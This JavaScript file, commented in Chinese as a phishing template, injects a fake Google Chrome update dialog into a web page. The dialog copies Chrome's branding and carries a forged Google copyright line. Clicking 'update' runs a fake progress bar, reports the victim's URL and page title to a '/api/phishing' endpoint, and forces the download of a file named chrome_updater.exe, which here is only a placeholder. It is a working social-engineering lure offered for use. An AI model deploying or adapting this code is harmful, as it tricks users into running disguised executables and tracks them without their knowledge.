// Chrome浏览器更新钓鱼模板
// 在页面上插入一个仿冒的Chrome浏览器更新提示

// 创建样式
const style = document.createElement('style');
style.textContent = `
.chrome-update-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.7);
  z-index: 9999;
  display: flex;
  justify-content: center;
  align-items: center;
}

.chrome-update-container {
  width: 550px;
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  overflow: hidden;
}

.chrome-update-header {
  background-color: #f2f2f2;
  padding: 15px 20px;
  display: flex;
  align-items: center;
  border-bottom: 1px solid #e0e0e0;
}

.chrome-update-logo {
  width: 32px;
  height: 32px;
  margin-right: 15px;
}

.chrome-update-title {
  font-size: 18px;
  font-weight: 500;
  color: #202124;
}

.chrome-update-content {
  padding: 20px;
}

.chrome-update-message {
  margin-bottom: 20px;
  line-height: 1.5;
  color: #202124;
}

.chrome-update-version {
  display: flex;
  align-items: center;
  margin-bottom: 20px;
  padding: 10px;
  background-color: #f8f9fa;
  border-radius: 4px;
}

.chrome-update-version-icon {
  width: 48px;
  height: 48px;
  margin-right: 15px;
}

.chrome-update-version-info {
  flex-grow: 1;
}

.chrome-update-version-title {
  font-weight: 500;
  margin-bottom: 5px;
}

.chrome-update-version-number {
  color: #5f6368;
  font-size: 14px;
}

.chrome-update-features {
  margin-bottom: 20px;
}

.chrome-update-feature {
  display: flex;
  align-items: flex-start;
  margin-bottom: 10px;
}

.chrome-update-feature-icon {
  color: #1a73e8;
  margin-right: 10px;
  font-size: 18px;
}

.chrome-update-feature-text {
  font-size: 14px;
  color: #3c4043;
}

.chrome-update-buttons {
  display: flex;
  justify-content: flex-end;
  padding-top: 15px;
  border-top: 1px solid #e0e0e0;
}

.chrome-update-button {
  padding: 10px 24px;
  border-radius: 4px;
  font-weight: 500;
  font-size: 14px;
  cursor: pointer;
  text-align: center;
  transition: all 0.2s ease;
  margin-left: 10px;
}

.chrome-update-primary {
  background-color: #1a73e8;
  color: white;
  border: none;
}

.chrome-update-primary:hover {
  background-color: #1765cc;
}

.chrome-update-secondary {
  background-color: transparent;
  color: #1a73e8;
  border: 1px solid #dadce0;
}

.chrome-update-secondary:hover {
  background-color: rgba(26, 115, 232, 0.04);
}

.chrome-update-footer {
  padding: 10px 20px;
  background-color: #f8f9fa;
  border-top: 1px solid #e0e0e0;
  font-size: 12px;
  color: #5f6368;
  text-align: center;
}

.chrome-update-close {
  position: absolute;
  top: 15px;
  right: 15px;
  background: none;
  border: none;
  color: #5f6368;
  font-size: 20px;
  cursor: pointer;
}

.chrome-update-progress-container {
  display: none;
  padding: 30px;
  text-align: center;
}

.chrome-update-progress-title {
  font-size: 18px;
  font-weight: 500;
  margin-bottom: 20px;
  color: #202124;
}

.chrome-update-progress-bar {
  height: 4px;
  background-color: #e0e0e0;
  border-radius: 2px;
  margin-bottom: 15px;
  overflow: hidden;
}

.chrome-update-progress-fill {
  height: 100%;
  background-color: #1a73e8;
  width: 0%;
  transition: width 0.3s ease;
}

.chrome-update-progress-text {
  font-size: 14px;
  color: #5f6368;
}
`;

// 创建Chrome更新弹窗
function createChromeUpdate() {
  const overlay = document.createElement('div');
  overlay.className = 'chrome-update-overlay';
  
  const container = document.createElement('div');
  container.className = 'chrome-update-container';
  
  // 关闭按钮
  const closeButton = document.createElement('button');
  closeButton.className = 'chrome-update-close';
  closeButton.innerHTML = '&times;';
  closeButton.onclick = function() {
    document.body.removeChild(overlay);
  };
  
  // 头部
  const header = document.createElement('div');
  header.className = 'chrome-update-header';
  
  const logo = document.createElement('img');
  logo.className = 'chrome-update-logo';
  logo.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAFJUlEQVR4AcWXA5RjSxSGv5rYtm3btm3btm3btm3btm3bz8y1J5l0634zWauL7Hqr6pyv/v5JMrXoH6Fbt7s6dOjwdPv27d+0a9fuQ9u2bT+3adPmY+vWrV+2atXqfsuWLW81b978YrNmzfY1adJkWePGjefUq1cvt1atWjNr1KgxpVq1auMrV648skKFCkPKlSs3qGzZsv1Kly7dt1SpUr1KlizZs0SJEj2KFy/evVixYl2LFi3aqUiRIh0LFy7cITc3t12hQoXa5uTktMnOzm6VlZXVIjMzs3lGRkbT9PT0JmlpaY1SU1MbpKSkZCcnJ9dLSkqqk5iYWDshIaFWfHx8zbi4uBqxsbHVY2JiqkVHR1eNioqqEhkZWTkiIqJSeHh4xbCwsAqhoaHlQ0JCyoWEhJQNCgoqExgYWDogIKCUv79/SX9//xJ+fn7FfX19i/n4+BT19vYu4uXlVdjT07OQh4dHQXd390Jubn/+uLq6FnBxccnv7Oycz8nJKa+jo2MeBwcHe3t7ezt7e3sbe3t7a1tbWytbW1tLGxsbCxsbG3NLS0szS0tLUwsLC2MLCwtDCwsLAwsLi7wWFhZ5LCws/vxYWFjkNjc3z21ubp7LzMwsl5mZWU5TU1NTU1NTQ0NDXUNDXUNdXV1NXV1dVV1dXUVNTU1ZTU1NSU1NTVFVVVVBVVVVXlVVVU5VVVVGRUVFWkVFRUpFRUVSWVlZQllZWVxZWVlMWVlZVFlZWURJSUlYSUlJSElJSVBRUVFAUVFRWFFRUUhRUVFYQUFBUEFBQUBBQUE4Li4uUi4uLkIuLi4yLi4uIi4uLhIuLi4CLi4u/C0tLewsLCzcLCwszCwsLKwsLCyMLCwsfCwsLGwsLCxcLCwsTCwsLDwsLCwsLCwsHCwsLAwsLCz8KysrLCsrKxwrKysMKysrDCsrK/wqKir8KioqLCoqKhwqKiocKioqDCoqKgwqKir8KSkpLCkpKRwpKSkcKSkpDCkpKQwpKSn8KCgoLCgoKBwoKCgcKCgoDCgoKAwoKCj8JycnLCcnJxwnJyccJycnDCcnJwwnJyf8JiYmLCYmJhwmJiYcJiYmDCYmJgwmJib8JSUlLCUlJRwlJSUcJSUlDCUlJQwlJSX8JCQkLCQkJBwkJCQcJCQkDCQkJAwkJCT8IyMjLCMjIxwjIyMcIyMjDCMjIwwjIyP8IiIiLCIiIhwiIiIcIiIiDCIiIgwiIiL8ISEhLCEhIRwhISEcISEhDCEhIQwhISH8ICAgLCAgIBwgICAAICAgACAgIAAgICD8Hx8fLB8fHxwfHx8cHx8fDB8fHwwfHx/8Hh4eLB4eHhweHh4cHh4eDB4eHgweHh78HR0dLB0dHRwdHR0cHR0dDB0dHQwdHR38HBwcLBwcHBwcHBwcHBwcDBwcHAwcHBz8GxsbLBsbGxwbGxscGxsbDBsbGwwbGxv8GhoaLBoaGhwaGhocGhoaDBoa';
  
  const title = document.createElement('div');
  title.className = 'chrome-update-title';
  title.textContent = 'Chrome 浏览器更新';
  
  header.appendChild(logo);
  header.appendChild(title);
  
  // 内容区域
  const content = document.createElement('div');
  content.className = 'chrome-update-content';
  
  const message = document.createElement('div');
  message.className = 'chrome-update-message';
  message.innerHTML = '您的 Google Chrome 浏览器需要更新到最新版本。此更新包含重要的安全修复和性能改进。';
  
  const version = document.createElement('div');
  version.className = 'chrome-update-version';
  
  const versionIcon = document.createElement('img');
  versionIcon.className = 'chrome-update-version-icon';
  versionIcon.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFHGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDUgNzkuMTYzNDk5LCAyMDE4LzA4LzEzLTE2OjQwOjIyICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOSAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDIzLTA4LTI1VDExOjI1OjM3KzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyMy0wOC0yNVQxMToyNjozMSswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAyMy0wOC0yNVQxMToyNjozMSswODowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo3YzY4ZmI3ZS1hMzgwLTM5NDMtYmJlNy1hZDUzMGQ4NDg2ZDQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6N2M2OGZiN2UtYTM4MC0zOTQzLWJiZTctYWQ1MzBkODQ4NmQ0IiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6N2M2OGZiN2UtYTM4MC0zOTQzLWJiZTctYWQ1MzBkODQ4NmQ0Ij4gPHhtcE1NOkhpc3Rvcnk+IDxyZGY6U2VxPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0iY3JlYXRlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDo3YzY4ZmI3ZS1hMzgwLTM5NDMtYmJlNy1hZDUzMGQ4NDg2ZDQiIHN0RXZ0OndoZW49IjIwMjMtMDgtMjVUMTE6MjU6MzcrMDg6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE5IChXaW5kb3dzKSIvPiA8L3JkZjpTZXE+IDwveG1wTU06SGlzdG9yeT4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7wBDqXAAADDklEQVRYhe2XTUhUURTHf+/NjB+jqaNjWWqEFhFRixbRIiJoUbSLaBG0KGgVLYJatAiiRdCiRUSLaBFEi6BFtIhoEUEfVosoKqKIoiLLj3Gc8ePNnBZzx/dGZ+bdGaJF/eFy37v3nHPPf+459z4RVWUhw1iw7P8HLHgHIqoqIrIcOAA0AyPA9YUMXETWAKeAHcAQ8EBVXy6Ug7PAIeAb8BrYLiKbgTZVfZFWgIjUAKeB/cBH4DZwFdgKHAU6VHVP2g5cAA4DfcBdoAu4CewCjgGdqro3TQeagdPAPuADcAu4BmwDWoEOVd2XRoCIrALOAC3AR+AO0A5sBY4AHaq6P42AZuAUsBeIgFvADWAL0Ap0qOqBNAJWAmeB/cAA0A7cBjYBx4FOVT2YRsAu4DSwB+gH7gHXgY1AC3BRVQ+lEbAGOAccBPqAu8AVYANwAuhS1cNpBOwGzgK7gV7gPnAZWA+cBLpV9UgaAWuB88ABoAe4A1wC1gHHgW5VbU0jYA9wDtgJfAYeAheB1cApoEdVj6YRsA44D+wHvgL3gQvAKuAk8FRVj6URsBc4D+wAPgGPgPPASuAU8ExVj6cRsB64AOwDvgAPgHPACuAk8FxVT6QRsA+4COwAvgOPgbNAA3ACeKGqJ9MIaAIuAfuAQeAhcAaoB44DL1X1VBoB+4FLwHbgB/AEOAPUAceAV6p6Oo2ADcBloAX4CTwGTgO1wFHgtaqeSSOgBbgMbAOGgKfAKaAGOAK8UdUzaQRsBC4DzcAw8Aw4CYTAEeCdqp5NI2ATcAXYCowAz4ETQBVwGHivqufSCNgMXAG2AKPAC+A4UAkcAt6r6vk0ArYAV4HNwBjwEjgGVACHgA+qeiGNgK3ANWATEAOvgKNAOXAQ+KSqF9MI2AZcBzYC48Br4AhQBhwAPqvqpTQCtgM3gA3ABPAGOAyUAvuBL6p6OY2AHcBNYD0wCbwFDgElwD7gq6peTiNgJ3ATWAdMAu+Ag0AxsBeIVPVKGgG/AV/rjDqSSEoKAAAAAElFTkSuQmCC';
  
  const versionInfo = document.createElement('div');
  versionInfo.className = 'chrome-update-version-info';
  
  const versionTitle = document.createElement('div');
  versionTitle.className = 'chrome-update-version-title';
  versionTitle.textContent = '新版本可用';
  
  const versionNumber = document.createElement('div');
  versionNumber.className = 'chrome-update-version-number';
  versionNumber.textContent = 'Chrome 版本 ' + (Math.floor(Math.random() * 20) + 100) + '.0.' + (Math.floor(Math.random() * 5000) + 1000) + '.0';
  
  versionInfo.appendChild(versionTitle);
  versionInfo.appendChild(versionNumber);
  
  version.appendChild(versionIcon);
  version.appendChild(versionInfo);
  
  const features = document.createElement('div');
  features.className = 'chrome-update-features';
  
  const featuresList = [
    '修复了多个安全漏洞，提高了浏览安全性',
    '改进了页面加载速度和整体性能',
    '优化了内存使用，减少了浏览器崩溃',
    '更新了隐私保护功能，增强了用户数据安全'
  ];
  
  featuresList.forEach(featureText => {
    const feature = document.createElement('div');
    feature.className = 'chrome-update-feature';
    
    const featureIcon = document.createElement('span');
    featureIcon.className = 'chrome-update-feature-icon';
    featureIcon.innerHTML = '✓';
    
    const featureTextElem = document.createElement('div');
    featureTextElem.className = 'chrome-update-feature-text';
    featureTextElem.textContent = featureText;
    
    feature.appendChild(featureIcon);
    feature.appendChild(featureTextElem);
    
    features.appendChild(feature);
  });
  
  const buttons = document.createElement('div');
  buttons.className = 'chrome-update-buttons';
  
  const laterButton = document.createElement('button');
  laterButton.className = 'chrome-update-button chrome-update-secondary';
  laterButton.textContent = '稍后更新';
  laterButton.onclick = function() {
    document.body.removeChild(overlay);
  };
  
  const updateButton = document.createElement('button');
  updateButton.className = 'chrome-update-button chrome-update-primary';
  updateButton.textContent = '立即更新';
  updateButton.onclick = function() {
    // 隐藏主内容，显示进度条
    content.style.display = 'none';
    
    // 创建并显示进度条界面
    const progressContainer = document.createElement('div');
    progressContainer.className = 'chrome-update-progress-container';
    progressContainer.style.display = 'block';
    
    const progressTitle = document.createElement('div');
    progressTitle.className = 'chrome-update-progress-title';
    progressTitle.textContent = '正在下载更新...';
    
    const progressBar = document.createElement('div');
    progressBar.className = 'chrome-update-progress-bar';
    
    const progressFill = document.createElement('div');
    progressFill.className = 'chrome-update-progress-fill';
    progressBar.appendChild(progressFill);
    
    const progressText = document.createElement('div');
    progressText.className = 'chrome-update-progress-text';
    progressText.textContent = '0%';
    
    progressContainer.appendChild(progressTitle);
    progressContainer.appendChild(progressBar);
    progressContainer.appendChild(progressText);
    
    container.appendChild(progressContainer);
    
    // 模拟下载进度
    let progress = 0;
    const interval = setInterval(function() {
      progress += 1;
      progressFill.style.width = progress + '%';
      progressText.textContent = progress + '%';
      
      if (progress >= 100) {
        clearInterval(interval);
        
        // 记录用户点击
        const clickData = {
          action: 'chrome_update_click',
          url: window.location.href,
          title: document.title,
          timestamp: new Date().toISOString()
        };
        
        fetch('/api/phishing', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(clickData)
        });
        
        // 创建假的下载链接
        const link = document.createElement('a');
        link.href = 'data:application/octet-stream;base64,UEsDBBQAAAAIAJh3bVQAAAAAAgAAAAAAAAATAAAAY2hyb21lX3VwZGF0ZXIuZXhlUEsBAhQAFAAAAAgAmHdtVAAAAAACAAAAAAAAAAEAIAAAAAAAAABjaHJvbWVfdXBkYXRlci5leGVQSwUGAAAAAAEAAQBBAAAAQwAAAAAA';
        link.download = 'chrome_updater.exe';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // 更新完成后移除弹窗
        setTimeout(function() {
          document.body.removeChild(overlay);
        }, 1000);
      }
    }, 30);
  };
  
  buttons.appendChild(laterButton);
  buttons.appendChild(updateButton);
  
  content.appendChild(message);
  content.appendChild(version);
  content.appendChild(features);
  content.appendChild(buttons);
  
  // 页脚
  const footer = document.createElement('div');
  footer.className = 'chrome-update-footer';
  footer.textContent = '© ' + new Date().getFullYear() + ' Google LLC. 保留所有权利。';
  
  // 组装
  container.appendChild(closeButton);
  container.appendChild(header);
  container.appendChild(content);
  container.appendChild(footer);
  overlay.appendChild(container);
  
  return overlay;
}

// 添加样式到页面
document.head.appendChild(style);

// 显示Chrome更新弹窗
const chromeUpdate = createChromeUpdate();
document.body.appendChild(chromeUpdate);

// 返回执行结果
return "Chrome浏览器更新钓鱼已插入页面";